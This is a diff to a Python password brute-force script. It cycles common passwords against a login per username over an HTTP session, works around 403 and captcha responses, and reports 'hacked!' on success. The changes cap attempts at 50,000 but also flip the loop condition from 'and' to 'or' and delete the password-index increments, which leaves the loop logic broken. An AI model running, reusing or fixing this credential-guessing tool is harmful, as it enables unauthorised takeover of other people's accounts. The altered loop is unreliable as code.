@@ -63,6 +63,8 @@ def start_brute_force():
         try:
             if brute_force(u):
                 print("hacked!")
+            else:
+                print("password too strong")
         except Exception as e:
             print("EXCEPTION:", e)
             print('error in sending info to the server')
@@ -72,7 +74,7 @@ def brute_force(username):
     common_passwords = load_common_password()
     print("passwords loaded")
     start_time = time.time()  
-    max_attempts = 1000000    
+    max_attempts = 50000    
     max_seconds = 2 * 3600   # 2 hours in secs
     attempt_count = 0
     session = requests.Session()
@@ -82,7 +84,7 @@ def brute_force(username):
     i = 0 
     answer = 0
 
-    while answer != 200 and i < len(common_passwords):
+    while answer != 200 or i < len(common_passwords):
         password = common_passwords[i]
         
         #check attempts limit
@@ -130,10 +132,8 @@ def brute_force(username):
                         code = generate_code()
                     elif answer[0] == 403 and "captcha" in answer[1]:
                         type = "captcha"
-                        i += 1
                         code = generate_code()
-                    else:
-                        i += 1
+
                     
     if answer == 200:
         return 1       
